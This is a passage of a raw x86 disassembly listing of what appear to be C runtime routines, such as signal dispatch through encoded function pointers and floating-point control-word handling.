  407d9f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407da2:	56                   	push   %esi
  407da3:	e8 2e 00 00 00       	call   0x407dd6
  407da8:	8b f0                	mov    %eax,%esi
  407daa:	85 f6                	test   %esi,%esi
  407dac:	74 17                	je     0x407dc5
  407dae:	ff 75 08             	push   0x8(%ebp)
  407db1:	8b ce                	mov    %esi,%ecx
  407db3:	ff 15 3c d1 40 00    	call   *0x40d13c
  407db9:	ff d6                	call   *%esi
  407dbb:	59                   	pop    %ecx
  407dbc:	85 c0                	test   %eax,%eax
  407dbe:	74 05                	je     0x407dc5
  407dc0:	33 c0                	xor    %eax,%eax
  407dc2:	40                   	inc    %eax
  407dc3:	eb 02                	jmp    0x407dc7
  407dc5:	33 c0                	xor    %eax,%eax
  407dc7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407dca:	33 cd                	xor    %ebp,%ecx
  407dcc:	5e                   	pop    %esi
  407dcd:	e8 8c 94 ff ff       	call   0x40125e
  407dd2:	8b e5                	mov    %ebp,%esp
  407dd4:	5d                   	pop    %ebp
  407dd5:	c3                   	ret
  407dd6:	6a 0c                	push   $0xc
  407dd8:	68 60 28 41 00       	push   $0x412860
  407ddd:	e8 be 9d ff ff       	call   0x401ba0
  407de2:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  407de6:	6a 00                	push   $0x0
  407de8:	e8 f5 ec ff ff       	call   0x406ae2
  407ded:	59                   	pop    %ecx
  407dee:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407df2:	8b 35 00 40 41 00    	mov    0x414000,%esi
  407df8:	8b ce                	mov    %esi,%ecx
  407dfa:	83 e1 1f             	and    $0x1f,%ecx
  407dfd:	33 35 a4 51 41 00    	xor    0x4151a4,%esi
  407e03:	d3 ce                	ror    %cl,%esi
  407e05:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407e08:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407e0f:	e8 0b 00 00 00       	call   0x407e1f
  407e14:	8b c6                	mov    %esi,%eax
  407e16:	e8 d5 9d ff ff       	call   0x401bf0
  407e1b:	c3                   	ret
  407e1c:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  407e1f:	6a 00                	push   $0x0
  407e21:	e8 04 ed ff ff       	call   0x406b2a
  407e26:	59                   	pop    %ecx
  407e27:	c3                   	ret
  407e28:	6a 0c                	push   $0xc
  407e2a:	68 a0 28 41 00       	push   $0x4128a0
  407e2f:	e8 6c 9d ff ff       	call   0x401ba0
  407e34:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  407e38:	8b 45 08             	mov    0x8(%ebp),%eax
  407e3b:	ff 30                	push   (%eax)
  407e3d:	e8 a0 ec ff ff       	call   0x406ae2
  407e42:	59                   	pop    %ecx
  407e43:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407e47:	8b 35 00 40 41 00    	mov    0x414000,%esi
  407e4d:	8b ce                	mov    %esi,%ecx
  407e4f:	83 e1 1f             	and    $0x1f,%ecx
  407e52:	33 35 b0 51 41 00    	xor    0x4151b0,%esi
  407e58:	d3 ce                	ror    %cl,%esi
  407e5a:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  407e5d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407e64:	e8 0d 00 00 00       	call   0x407e76
  407e69:	8b c6                	mov    %esi,%eax
  407e6b:	e8 80 9d ff ff       	call   0x401bf0
  407e70:	c2 0c 00             	ret    $0xc
  407e73:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  407e76:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407e79:	ff 31                	push   (%ecx)
  407e7b:	e8 aa ec ff ff       	call   0x406b2a
  407e80:	59                   	pop    %ecx
  407e81:	c3                   	ret
  407e82:	8b ff                	mov    %edi,%edi
  407e84:	55                   	push   %ebp
  407e85:	8b ec                	mov    %esp,%ebp
  407e87:	83 ec 0c             	sub    $0xc,%esp
  407e8a:	8b 45 08             	mov    0x8(%ebp),%eax
  407e8d:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  407e90:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407e93:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407e96:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407e99:	50                   	push   %eax
  407e9a:	ff 75 0c             	push   0xc(%ebp)
  407e9d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407ea0:	50                   	push   %eax
  407ea1:	e8 82 ff ff ff       	call   0x407e28
  407ea6:	8b e5                	mov    %ebp,%esp
  407ea8:	5d                   	pop    %ebp
  407ea9:	c3                   	ret
  407eaa:	8b ff                	mov    %edi,%edi
  407eac:	55                   	push   %ebp
  407ead:	8b ec                	mov    %esp,%ebp
  407eaf:	8b 45 08             	mov    0x8(%ebp),%eax
  407eb2:	48                   	dec    %eax
  407eb3:	83 e8 01             	sub    $0x1,%eax
  407eb6:	74 2d                	je     0x407ee5
  407eb8:	83 e8 04             	sub    $0x4,%eax
  407ebb:	74 13                	je     0x407ed0
  407ebd:	83 e8 09             	sub    $0x9,%eax
  407ec0:	74 1c                	je     0x407ede
  407ec2:	83 e8 06             	sub    $0x6,%eax
  407ec5:	74 10                	je     0x407ed7
  407ec7:	83 e8 01             	sub    $0x1,%eax
  407eca:	74 04                	je     0x407ed0
  407ecc:	33 c0                	xor    %eax,%eax
  407ece:	5d                   	pop    %ebp
  407ecf:	c3                   	ret
  407ed0:	b8 b0 51 41 00       	mov    $0x4151b0,%eax
  407ed5:	5d                   	pop    %ebp
  407ed6:	c3                   	ret
  407ed7:	b8 ac 51 41 00       	mov    $0x4151ac,%eax
  407edc:	5d                   	pop    %ebp
  407edd:	c3                   	ret
  407ede:	b8 b4 51 41 00       	mov    $0x4151b4,%eax
  407ee3:	5d                   	pop    %ebp
  407ee4:	c3                   	ret
  407ee5:	b8 a8 51 41 00       	mov    $0x4151a8,%eax
  407eea:	5d                   	pop    %ebp
  407eeb:	c3                   	ret
  407eec:	8b ff                	mov    %edi,%edi
  407eee:	55                   	push   %ebp
  407eef:	8b ec                	mov    %esp,%ebp
  407ef1:	6b 0d 20 dd 40 00 0c 	imul   $0xc,0x40dd20,%ecx
  407ef8:	8b 45 0c             	mov    0xc(%ebp),%eax
  407efb:	03 c8                	add    %eax,%ecx
  407efd:	3b c1                	cmp    %ecx,%eax
  407eff:	74 0f                	je     0x407f10
  407f01:	8b 55 08             	mov    0x8(%ebp),%edx
  407f04:	39 50 04             	cmp    %edx,0x4(%eax)
  407f07:	74 09                	je     0x407f12
  407f09:	83 c0 0c             	add    $0xc,%eax
  407f0c:	3b c1                	cmp    %ecx,%eax
  407f0e:	75 f4                	jne    0x407f04
  407f10:	33 c0                	xor    %eax,%eax
  407f12:	5d                   	pop    %ebp
  407f13:	c3                   	ret
  407f14:	8b ff                	mov    %edi,%edi
  407f16:	55                   	push   %ebp
  407f17:	8b ec                	mov    %esp,%ebp
  407f19:	51                   	push   %ecx
  407f1a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  407f1d:	50                   	push   %eax
  407f1e:	6a 03                	push   $0x3
  407f20:	e8 5d ff ff ff       	call   0x407e82
  407f25:	59                   	pop    %ecx
  407f26:	59                   	pop    %ecx
  407f27:	8b e5                	mov    %ebp,%esp
  407f29:	5d                   	pop    %ebp
  407f2a:	c3                   	ret
  407f2b:	8b ff                	mov    %edi,%edi
  407f2d:	55                   	push   %ebp
  407f2e:	8b ec                	mov    %esp,%ebp
  407f30:	ff 75 08             	push   0x8(%ebp)
  407f33:	b9 a8 51 41 00       	mov    $0x4151a8,%ecx
  407f38:	e8 5a c3 ff ff       	call   0x404297
  407f3d:	ff 75 08             	push   0x8(%ebp)
  407f40:	b9 ac 51 41 00       	mov    $0x4151ac,%ecx
  407f45:	e8 4d c3 ff ff       	call   0x404297
  407f4a:	ff 75 08             	push   0x8(%ebp)
  407f4d:	b9 b0 51 41 00       	mov    $0x4151b0,%ecx
  407f52:	e8 40 c3 ff ff       	call   0x404297
  407f57:	ff 75 08             	push   0x8(%ebp)
  407f5a:	b9 b4 51 41 00       	mov    $0x4151b4,%ecx
  407f5f:	e8 33 c3 ff ff       	call   0x404297
  407f64:	5d                   	pop    %ebp
  407f65:	c3                   	ret
  407f66:	e8 b9 d8 ff ff       	call   0x405824
  407f6b:	83 c0 08             	add    $0x8,%eax
  407f6e:	c3                   	ret
  407f6f:	6a 2c                	push   $0x2c
  407f71:	68 80 28 41 00       	push   $0x412880
  407f76:	e8 a5 40 00 00       	call   0x40c020
  407f7b:	33 db                	xor    %ebx,%ebx
  407f7d:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407f80:	21 5d cc             	and    %ebx,-0x34(%ebp)
  407f83:	b1 01                	mov    $0x1,%cl
  407f85:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  407f88:	8b 75 08             	mov    0x8(%ebp),%esi
  407f8b:	6a 08                	push   $0x8
  407f8d:	5f                   	pop    %edi
  407f8e:	3b f7                	cmp    %edi,%esi
  407f90:	7f 18                	jg     0x407faa
  407f92:	74 35                	je     0x407fc9
  407f94:	8d 46 ff             	lea    -0x1(%esi),%eax
  407f97:	83 e8 01             	sub    $0x1,%eax
  407f9a:	74 22                	je     0x407fbe
  407f9c:	48                   	dec    %eax
  407f9d:	83 e8 01             	sub    $0x1,%eax
  407fa0:	74 27                	je     0x407fc9
  407fa2:	48                   	dec    %eax
  407fa3:	83 e8 01             	sub    $0x1,%eax
  407fa6:	75 4c                	jne    0x407ff4
  407fa8:	eb 14                	jmp    0x407fbe
  407faa:	83 fe 0b             	cmp    $0xb,%esi
  407fad:	74 1a                	je     0x407fc9
  407faf:	83 fe 0f             	cmp    $0xf,%esi
  407fb2:	74 0a                	je     0x407fbe
  407fb4:	83 fe 14             	cmp    $0x14,%esi
  407fb7:	7e 3b                	jle    0x407ff4
  407fb9:	83 fe 16             	cmp    $0x16,%esi
  407fbc:	7f 36                	jg     0x407ff4
  407fbe:	56                   	push   %esi
  407fbf:	e8 e6 fe ff ff       	call   0x407eaa
  407fc4:	83 c4 04             	add    $0x4,%esp
  407fc7:	eb 45                	jmp    0x40800e
  407fc9:	e8 da d8 ff ff       	call   0x4058a8
  407fce:	8b d8                	mov    %eax,%ebx
  407fd0:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407fd3:	85 db                	test   %ebx,%ebx
  407fd5:	75 08                	jne    0x407fdf
  407fd7:	83 c8 ff             	or     $0xffffffff,%eax
  407fda:	e9 92 01 00 00       	jmp    0x408171
  407fdf:	ff 33                	push   (%ebx)
  407fe1:	56                   	push   %esi
  407fe2:	e8 05 ff ff ff       	call   0x407eec
  407fe7:	59                   	pop    %ecx
  407fe8:	59                   	pop    %ecx
  407fe9:	33 c9                	xor    %ecx,%ecx
  407feb:	85 c0                	test   %eax,%eax
  407fed:	0f 95 c1             	setne  %cl
  407ff0:	85 c9                	test   %ecx,%ecx
  407ff2:	75 12                	jne    0x408006
  407ff4:	e8 00 dc ff ff       	call   0x405bf9
  407ff9:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  407fff:	e8 39 db ff ff       	call   0x405b3d
  408004:	eb d1                	jmp    0x407fd7
  408006:	83 c0 08             	add    $0x8,%eax
  408009:	32 c9                	xor    %cl,%cl
  40800b:	88 4d e3             	mov    %cl,-0x1d(%ebp)
  40800e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  408011:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  408015:	84 c9                	test   %cl,%cl
  408017:	74 0b                	je     0x408024
  408019:	6a 03                	push   $0x3
  40801b:	e8 c2 ea ff ff       	call   0x406ae2
  408020:	59                   	pop    %ecx
  408021:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  408024:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  408028:	c6 45 e2 00          	movb   $0x0,-0x1e(%ebp)
  40802c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408030:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408033:	84 c9                	test   %cl,%cl
  408035:	74 14                	je     0x40804b
  408037:	8b 15 00 40 41 00    	mov    0x414000,%edx
  40803d:	8b ca                	mov    %edx,%ecx
  40803f:	83 e1 1f             	and    $0x1f,%ecx
  408042:	33 10                	xor    (%eax),%edx
  408044:	d3 ca                	ror    %cl,%edx
  408046:	8a 4d e3             	mov    -0x1d(%ebp),%cl
  408049:	eb 02                	jmp    0x40804d
  40804b:	8b 10                	mov    (%eax),%edx
  40804d:	8b c2                	mov    %edx,%eax
  40804f:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408052:	33 d2                	xor    %edx,%edx
  408054:	83 f8 01             	cmp    $0x1,%eax
  408057:	0f 94 c2             	sete   %dl
  40805a:	89 55 c8             	mov    %edx,-0x38(%ebp)
  40805d:	88 55 e2             	mov    %dl,-0x1e(%ebp)
  408060:	84 d2                	test   %dl,%dl
  408062:	0f 85 8a 00 00 00    	jne    0x4080f2
  408068:	85 c0                	test   %eax,%eax
  40806a:	75 13                	jne    0x40807f
  40806c:	84 c9                	test   %cl,%cl
  40806e:	74 08                	je     0x408078
  408070:	6a 03                	push   $0x3
  408072:	e8 b3 ea ff ff       	call   0x406b2a
  408077:	59                   	pop    %ecx
  408078:	6a 03                	push   $0x3
  40807a:	e8 14 cb ff ff       	call   0x404b93
  40807f:	3b f7                	cmp    %edi,%esi
  408081:	74 0a                	je     0x40808d
  408083:	83 fe 0b             	cmp    $0xb,%esi
  408086:	74 05                	je     0x40808d
  408088:	83 fe 04             	cmp    $0x4,%esi
  40808b:	75 23                	jne    0x4080b0
  40808d:	8b 43 04             	mov    0x4(%ebx),%eax
  408090:	89 45 d0             	mov    %eax,-0x30(%ebp)
  408093:	83 63 04 00          	andl   $0x0,0x4(%ebx)
  408097:	3b f7                	cmp    %edi,%esi
  408099:	75 3b                	jne    0x4080d6
  40809b:	e8 c6 fe ff ff       	call   0x407f66
  4080a0:	8b 00                	mov    (%eax),%eax
  4080a2:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4080a5:	e8 bc fe ff ff       	call   0x407f66
  4080aa:	c7 00 8c 00 00 00    	movl   $0x8c,(%eax)
  4080b0:	3b f7                	cmp    %edi,%esi
  4080b2:	75 22                	jne    0x4080d6
  4080b4:	6b 05 24 dd 40 00 0c 	imul   $0xc,0x40dd24,%eax
  4080bb:	03 03                	add    (%ebx),%eax
  4080bd:	6b 0d 28 dd 40 00 0c 	imul   $0xc,0x40dd28,%ecx
  4080c4:	03 c8                	add    %eax,%ecx
  4080c6:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4080c9:	3b c1                	cmp    %ecx,%eax
  4080cb:	74 25                	je     0x4080f2
  4080cd:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4080d1:	83 c0 0c             	add    $0xc,%eax
  4080d4:	eb f0                	jmp    0x4080c6
  4080d6:	a1 00 40 41 00       	mov    0x414000,%eax
  4080db:	83 e0 1f             	and    $0x1f,%eax
  4080de:	6a 20                	push   $0x20
  4080e0:	59                   	pop    %ecx
  4080e1:	2b c8                	sub    %eax,%ecx
  4080e3:	33 c0                	xor    %eax,%eax
  4080e5:	d3 c8                	ror    %cl,%eax
  4080e7:	33 05 00 40 41 00    	xor    0x414000,%eax
  4080ed:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4080f0:	89 01                	mov    %eax,(%ecx)
  4080f2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4080f9:	e8 31 00 00 00       	call   0x40812f
  4080fe:	80 7d c8 00          	cmpb   $0x0,-0x38(%ebp)
  408102:	75 6b                	jne    0x40816f
  408104:	3b f7                	cmp    %edi,%esi
  408106:	75 36                	jne    0x40813e
  408108:	e8 17 d7 ff ff       	call   0x405824
  40810d:	ff 70 08             	push   0x8(%eax)
  408110:	57                   	push   %edi
  408111:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408114:	ff 15 3c d1 40 00    	call   *0x40d13c
  40811a:	ff 55 dc             	call   *-0x24(%ebp)
  40811d:	59                   	pop    %ecx
  40811e:	eb 2b                	jmp    0x40814b
  408120:	6a 08                	push   $0x8
  408122:	5f                   	pop    %edi
  408123:	8b 75 08             	mov    0x8(%ebp),%esi
  408126:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  408129:	8a 45 e2             	mov    -0x1e(%ebp),%al
  40812c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40812f:	80 7d e3 00          	cmpb   $0x0,-0x1d(%ebp)
  408133:	74 08                	je     0x40813d
  408135:	6a 03                	push   $0x3
  408137:	e8 ee e9 ff ff       	call   0x406b2a
  40813c:	59                   	pop    %ecx
  40813d:	c3                   	ret
  40813e:	56                   	push   %esi
  40813f:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408142:	ff 15 3c d1 40 00    	call   *0x40d13c
  408148:	ff 55 dc             	call   *-0x24(%ebp)
  40814b:	59                   	pop    %ecx
  40814c:	3b f7                	cmp    %edi,%esi
  40814e:	74 0a                	je     0x40815a
  408150:	83 fe 0b             	cmp    $0xb,%esi
  408153:	74 05                	je     0x40815a
  408155:	83 fe 04             	cmp    $0x4,%esi
  408158:	75 15                	jne    0x40816f
  40815a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40815d:	89 43 04             	mov    %eax,0x4(%ebx)
  408160:	3b f7                	cmp    %edi,%esi
  408162:	75 0b                	jne    0x40816f
  408164:	e8 bb d6 ff ff       	call   0x405824
  408169:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40816c:	89 48 08             	mov    %ecx,0x8(%eax)
  40816f:	33 c0                	xor    %eax,%eax
  408171:	e8 fa 3e 00 00       	call   0x40c070
  408176:	c3                   	ret
  408177:	8b ff                	mov    %edi,%edi
  408179:	55                   	push   %ebp
  40817a:	8b ec                	mov    %esp,%ebp
  40817c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40817f:	33 c0                	xor    %eax,%eax
  408181:	f6 c1 10             	test   $0x10,%cl
  408184:	74 05                	je     0x40818b
  408186:	b8 80 00 00 00       	mov    $0x80,%eax
  40818b:	53                   	push   %ebx
  40818c:	56                   	push   %esi
  40818d:	57                   	push   %edi
  40818e:	bf 00 02 00 00       	mov    $0x200,%edi
  408193:	f6 c1 08             	test   $0x8,%cl
  408196:	74 02                	je     0x40819a
  408198:	0b c7                	or     %edi,%eax
  40819a:	f6 c1 04             	test   $0x4,%cl
  40819d:	74 05                	je     0x4081a4
  40819f:	0d 00 04 00 00       	or     $0x400,%eax
  4081a4:	f6 c1 02             	test   $0x2,%cl
  4081a7:	74 05                	je     0x4081ae
  4081a9:	0d 00 08 00 00       	or     $0x800,%eax
  4081ae:	f6 c1 01             	test   $0x1,%cl
  4081b1:	74 05                	je     0x4081b8
  4081b3:	0d 00 10 00 00       	or     $0x1000,%eax
  4081b8:	be 00 01 00 00       	mov    $0x100,%esi
  4081bd:	f7 c1 00 00 08 00    	test   $0x80000,%ecx
  4081c3:	74 02                	je     0x4081c7
  4081c5:	0b c6                	or     %esi,%eax
  4081c7:	8b d1                	mov    %ecx,%edx
  4081c9:	bb 00 03 00 00       	mov    $0x300,%ebx
  4081ce:	23 d3                	and    %ebx,%edx
  4081d0:	74 1f                	je     0x4081f1
  4081d2:	3b d6                	cmp    %esi,%edx
  4081d4:	74 16                	je     0x4081ec
  4081d6:	3b d7                	cmp    %edi,%edx
  4081d8:	74 0b                	je     0x4081e5
  4081da:	3b d3                	cmp    %ebx,%edx
  4081dc:	75 13                	jne    0x4081f1
  4081de:	0d 00 60 00 00       	or     $0x6000,%eax
  4081e3:	eb 0c                	jmp    0x4081f1
  4081e5:	0d 00 40 00 00       	or     $0x4000,%eax
  4081ea:	eb 05                	jmp    0x4081f1
  4081ec:	0d 00 20 00 00       	or     $0x2000,%eax
  4081f1:	ba 00 00 00 03       	mov    $0x3000000,%edx
  4081f6:	5f                   	pop    %edi
  4081f7:	23 ca                	and    %edx,%ecx
  4081f9:	5e                   	pop    %esi
  4081fa:	5b                   	pop    %ebx
  4081fb:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
  408201:	74 18                	je     0x40821b
  408203:	81 f9 00 00 00 02    	cmp    $0x2000000,%ecx
  408209:	74 0b                	je     0x408216
  40820b:	3b ca                	cmp    %edx,%ecx
  40820d:	75 11                	jne    0x408220
  40820f:	0d 00 80 00 00       	or     $0x8000,%eax
  408214:	5d                   	pop    %ebp
  408215:	c3                   	ret
  408216:	83 c8 40             	or     $0x40,%eax
  408219:	5d                   	pop    %ebp
  40821a:	c3                   	ret
  40821b:	0d 40 80 00 00       	or     $0x8040,%eax
  408220:	5d                   	pop    %ebp
  408221:	c3                   	ret
  408222:	8b ff                	mov    %edi,%edi
  408224:	55                   	push   %ebp
  408225:	8b ec                	mov    %esp,%ebp
  408227:	83 ec 10             	sub    $0x10,%esp
  40822a:	9b d9 7d f8          	fstcw  -0x8(%ebp)
  40822e:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  408232:	33 c9                	xor    %ecx,%ecx
  408234:	a8 01                	test   $0x1,%al
  408236:	74 03                	je     0x40823b
  408238:	6a 10                	push   $0x10
  40823a:	59                   	pop    %ecx
  40823b:	a8 04                	test   $0x4,%al
  40823d:	74 03                	je     0x408242
  40823f:	83 c9 08             	or     $0x8,%ecx
  408242:	a8 08                	test   $0x8,%al
  408244:	74 03                	je     0x408249
  408246:	83 c9 04             	or     $0x4,%ecx
  408249:	a8 10                	test   $0x10,%al
  40824b:	74 03                	je     0x408250
  40824d:	83 c9 02             	or     $0x2,%ecx
  408250:	a8 20                	test   $0x20,%al
  408252:	74 03                	je     0x408257
  408254:	83 c9 01             	or     $0x1,%ecx
  408257:	a8 02                	test   $0x2,%al
  408259:	74 06                	je     0x408261
  40825b:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  408261:	53                   	push   %ebx
  408262:	56                   	push   %esi
  408263:	0f b7 f0             	movzwl %ax,%esi
  408266:	bb 00 0c 00 00       	mov    $0xc00,%ebx
  40826b:	8b d6                	mov    %esi,%edx
  40826d:	57                   	push   %edi
  40826e:	bf 00 02 00 00       	mov    $0x200,%edi
  408273:	23 d3                	and    %ebx,%edx
  408275:	74 26                	je     0x40829d
  408277:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  40827d:	74 18                	je     0x408297
  40827f:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  408285:	74 0c                	je     0x408293
  408287:	3b d3                	cmp    %ebx,%edx
  408289:	75 12                	jne    0x40829d
  40828b:	81 c9 00 03 00 00    	or     $0x300,%ecx
  408291:	eb 0a                	jmp    0x40829d
  408293:	0b cf                	or     %edi,%ecx
  408295:	eb 06                	jmp    0x40829d
  408297:	81 c9 00 01 00 00    	or     $0x100,%ecx
  40829d:	81 e6 00 03 00 00    	and    $0x300,%esi
  4082a3:	74 0c                	je     0x4082b1
  4082a5:	3b f7                	cmp    %edi,%esi
  4082a7:	75 0e                	jne    0x4082b7
  4082a9:	81 c9 00 00 01 00    	or     $0x10000,%ecx
  4082af:	eb 06                	jmp    0x4082b7
  4082b1:	81 c9 00 00 02 00    	or     $0x20000,%ecx
  4082b7:	ba 00 10 00 00       	mov    $0x1000,%edx
  4082bc:	66 85 c2             	test   %ax,%dx
  4082bf:	74 06                	je     0x4082c7
  4082c1:	81 c9 00 00 04 00    	or     $0x40000,%ecx
  4082c7:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4082ca:	8b f7                	mov    %edi,%esi
  4082cc:	8b 45 08             	mov    0x8(%ebp),%eax
  4082cf:	f7 d6                	not    %esi
  4082d1:	23 f1                	and    %ecx,%esi
  4082d3:	23 c7                	and    %edi,%eax
  4082d5:	0b f0                	or     %eax,%esi
  4082d7:	3b f1                	cmp    %ecx,%esi
  4082d9:	0f 84 a6 00 00 00    	je     0x408385
  4082df:	56                   	push   %esi
  4082e0:	e8 3f 02 00 00       	call   0x408524
  4082e5:	59                   	pop    %ecx
  4082e6:	66 89 45 fc          	mov    %ax,-0x4(%ebp)
  4082ea:	d9 6d fc             	fldcw  -0x4(%ebp)
  4082ed:	9b d9 7d fc          	fstcw  -0x4(%ebp)
  4082f1:	66 8b 45 fc          	mov    -0x4(%ebp),%ax
  4082f5:	33 f6                	xor    %esi,%esi
  4082f7:	a8 01                	test   $0x1,%al
  4082f9:	74 03                	je     0x4082fe
  4082fb:	6a 10                	push   $0x10
  4082fd:	5e                   	pop    %esi
  4082fe:	a8 04                	test   $0x4,%al
  408300:	74 03                	je     0x408305
  408302:	83 ce 08             	or     $0x8,%esi
  408305:	a8 08                	test   $0x8,%al
  408307:	74 03                	je     0x40830c
  408309:	83 ce 04             	or     $0x4,%esi
  40830c:	a8 10                	test   $0x10,%al
  40830e:	74 03                	je     0x408313
  408310:	83 ce 02             	or     $0x2,%esi
  408313:	a8 20                	test   $0x20,%al
  408315:	74 03                	je     0x40831a
  408317:	83 ce 01             	or     $0x1,%esi
  40831a:	a8 02                	test   $0x2,%al
  40831c:	74 06                	je     0x408324
  40831e:	81 ce 00 00 08 00    	or     $0x80000,%esi
  408324:	0f b7 d0             	movzwl %ax,%edx
  408327:	8b ca                	mov    %edx,%ecx
  408329:	23 cb                	and    %ebx,%ecx
  40832b:	74 2a                	je     0x408357
  40832d:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  408333:	74 1c                	je     0x408351
  408335:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  40833b:	74 0c                	je     0x408349
  40833d:	3b cb                	cmp    %ebx,%ecx
  40833f:	75 16                	jne    0x408357
  408341:	81 ce 00 03 00 00    	or     $0x300,%esi
  408347:	eb 0e                	jmp    0x408357
  408349:	81 ce 00 02 00 00    	or     $0x200,%esi
  40834f:	eb 06                	jmp    0x408357
  408351:	81 ce 00 01 00 00    	or     $0x100,%esi
  408357:	81 e2 00 03 00 00    	and    $0x300,%edx
  40835d:	74 10                	je     0x40836f
  40835f:	81 fa 00 02 00 00    	cmp    $0x200,%edx
  408365:	75 0e                	jne    0x408375
  408367:	81 ce 00 00 01 00    	or     $0x10000,%esi
  40836d:	eb 06                	jmp    0x408375
  40836f:	81 ce 00 00 02 00    	or     $0x20000,%esi
  408375:	ba 00 10 00 00       	mov    $0x1000,%edx
  40837a:	66 85 c2             	test   %ax,%dx
  40837d:	74 06                	je     0x408385
  40837f:	81 ce 00 00 04 00    	or     $0x40000,%esi
  408385:	83 3d 34 4b 41 00 01 	cmpl   $0x1,0x414b34
  40838c:	0f 8c 89 01 00 00    	jl     0x40851b
  408392:	81 e7 1f 03 08 03    	and    $0x308031f,%edi
  408398:	0f ae 5d f0          	stmxcsr -0x10(%ebp)
  40839c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40839f:	33 c9                	xor    %ecx,%ecx
  4083a1:	84 c0                	test   %al,%al
  4083a3:	79 03                	jns    0x4083a8
  4083a5:	6a 10                	push   $0x10
  4083a7:	59                   	pop    %ecx
  4083a8:	a9 00 02 00 00       	test   $0x200,%eax
  4083ad:	74 03                	je     0x4083b2
  4083af:	83 c9 08             	or     $0x8,%ecx
  4083b2:	a9 00 04 00 00       	test   $0x400,%eax
  4083b7:	74 03                	je     0x4083bc
  4083b9:	83 c9 04             	or     $0x4,%ecx
  4083bc:	a9 00 08 00 00       	test   $0x800,%eax
  4083c1:	74 03                	je     0x4083c6
  4083c3:	83 c9 02             	or     $0x2,%ecx
  4083c6:	85 c2                	test   %eax,%edx
  4083c8:	74 03                	je     0x4083cd
  4083ca:	83 c9 01             	or     $0x1,%ecx
  4083cd:	a9 00 01 00 00       	test   $0x100,%eax
  4083d2:	74 06                	je     0x4083da
  4083d4:	81 c9 00 00 08 00    	or     $0x80000,%ecx
  4083da:	8b d0                	mov    %eax,%edx
  4083dc:	bb 00 60 00 00       	mov    $0x6000,%ebx
  4083e1:	23 d3                	and    %ebx,%edx
  4083e3:	74 2a                	je     0x40840f
  4083e5:	81 fa 00 20 00 00    	cmp    $0x2000,%edx
  4083eb:	74 1c                	je     0x408409
  4083ed:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  4083f3:	74 0c                	je     0x408401
  4083f5:	3b d3                	cmp    %ebx,%edx
  4083f7:	75 16                	jne    0x40840f
  4083f9:	81 c9 00 03 00 00    	or     $0x300,%ecx
  4083ff:	eb 0e                	jmp    0x40840f
  408401:	81 c9 00 02 00 00    	or     $0x200,%ecx
  408407:	eb 06                	jmp    0x40840f
  408409:	81 c9 00 01 00 00    	or     $0x100,%ecx
  40840f:	6a 40                	push   $0x40
  408411:	25 40 80 00 00       	and    $0x8040,%eax
  408416:	5b                   	pop    %ebx
  408417:	2b c3                	sub    %ebx,%eax
  408419:	74 1b                	je     0x408436
  40841b:	2d c0 7f 00 00       	sub    $0x7fc0,%eax
  408420:	74 0c                	je     0x40842e
  408422:	2b c3                	sub    %ebx,%eax
  408424:	75 16                	jne    0x40843c
  408426:	81 c9 00 00 00 01    	or     $0x1000000,%ecx
  40842c:	eb 0e                	jmp    0x40843c
  40842e:	81 c9 00 00 00 03    	or     $0x3000000,%ecx
  408434:	eb 06                	jmp    0x40843c
  408436:	81 c9 00 00 00 02    	or     $0x2000000,%ecx
  40843c:	8b c7                	mov    %edi,%eax
  40843e:	23 7d 08             	and    0x8(%ebp),%edi
  408441:	f7 d0                	not    %eax
  408443:	23 c1                	and    %ecx,%eax
  408445:	0b c7                	or     %edi,%eax
  408447:	3b c1                	cmp    %ecx,%eax
  408449:	0f 84 b5 00 00 00    	je     0x408504
  40844f:	50                   	push   %eax
  408450:	e8 22 fd ff ff       	call   0x408177
  408455:	50                   	push   %eax
